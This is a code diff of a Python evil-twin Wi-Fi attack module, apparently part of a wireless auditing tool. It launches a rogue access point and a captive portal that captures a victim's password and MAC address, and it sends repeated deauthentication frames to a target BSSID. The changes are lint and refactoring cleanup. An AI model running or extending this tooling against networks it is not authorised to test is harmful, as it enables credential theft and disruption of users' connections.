@@ -16,21 +16,17 @@ the tool indefinitely.
 
 from __future__ import annotations
 
-import ipaddress
 import os
 import signal
-import socket
 import subprocess
 import tempfile
 import textwrap
 import threading
 import time
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from typing import Optional
-from urllib.parse import parse_qs, urlparse
+from urllib.parse import parse_qs
 
-from ..radio import set_channel
 from .deauth import deauth as _deauth
 
 # ── constants ────────────────────────────────────────────────────────────────
@@ -51,8 +47,8 @@ _DNSMASQ_START_WAIT = 2
 class EvilTwinResult:
     """Outcome of a run_eviltwin() call."""
     success: bool = False
-    password: Optional[str] = None
-    client_mac: Optional[str] = None
+    password: str | None = None
+    client_mac: str | None = None
     elapsed: float = 0.0
     detail: str = ""
 
@@ -178,7 +174,7 @@ def _make_portal_handler(ssid: str, result_box: list):
 
 def _run(cmd: list[str], timeout: int = _CMD_TIMEOUT, check: bool = False) -> tuple[int, str]:
     try:
-        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=check)
         return r.returncode, (r.stdout + r.stderr).strip()
     except subprocess.TimeoutExpired:
         return -1, f"timeout after {timeout}s"
@@ -189,7 +185,7 @@ def _run(cmd: list[str], timeout: int = _CMD_TIMEOUT, check: bool = False) -> tu
 def _popen(cmd: list[str]) -> subprocess.Popen:
     return subprocess.Popen(
         cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-        preexec_fn=os.setsid,
+        preexec_fn=os.setsid,  # noqa: PLW1509 - needed for process-group cleanup
     )
 
 
@@ -197,7 +193,7 @@ def _popen(cmd: list[str]) -> subprocess.Popen:
 
 def _assign_ip(iface: str) -> bool:
     _run(["ip", "addr", "flush", "dev", iface])
-    rc, out = _run(["ip", "addr", "add", f"{_AP_IP}/{24}", "dev", iface])
+    rc, _out = _run(["ip", "addr", "add", f"{_AP_IP}/{24}", "dev", iface])
     if rc != 0:
         return False
     _run(["ip", "link", "set", iface, "up"])
@@ -260,17 +256,17 @@ def run_eviltwin(
         for p in procs:
             try:
                 os.killpg(os.getpgid(p.pid), signal.SIGTERM)
-            except Exception:
+            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                 pass
         for srv in servers:
             try:
                 srv.server_close()
-            except Exception:
+            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                 pass
         for f in tmpfiles:
             try:
                 os.unlink(f)
-            except Exception:
+            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                 pass
         _flush_ip(iface_ap)
         _iptables_nat_remove(iface_ap, iface_mon)
@@ -285,16 +281,14 @@ def run_eviltwin(
         # ── 2. write temp configs ─────────────────────────────────────────
         ap_chan = channel if 1 <= channel <= 13 else 6
 
-        hconf = tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
-                                            prefix="atwa_hostapd_", delete=False)
-        hconf.write(_hostapd_conf(iface_ap, ssid, ap_chan))
-        hconf.flush(); hconf.close()
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
+                                          prefix="atwa_hostapd_", delete=False) as hconf:
+            hconf.write(_hostapd_conf(iface_ap, ssid, ap_chan))
         tmpfiles.append(hconf.name)
 
-        dconf = tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
-                                            prefix="atwa_dnsmasq_", delete=False)
-        dconf.write(_dnsmasq_conf(iface_ap))
-        dconf.flush(); dconf.close()
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
+                                          prefix="atwa_dnsmasq_", delete=False) as dconf:
+            dconf.write(_dnsmasq_conf(iface_ap))
         tmpfiles.append(dconf.name)
 
         # ── 3. launch hostapd ─────────────────────────────────────────────
@@ -345,7 +339,7 @@ def run_eviltwin(
                         log(f"eviltwin deauth round {round_n}: did NOT go out to {bssid} — see the warning above")
                     else:
                         log(f"eviltwin deauth round {round_n}: sent {sent} deauth frame(s) to {bssid}")
-                except Exception as exc:
+                except Exception as exc:  # noqa: BLE001 - deauth loop must survive any one-round error
                     log(f"eviltwin deauth round {round_n} failed: {exc}")
                 stop.wait(10.0)
 
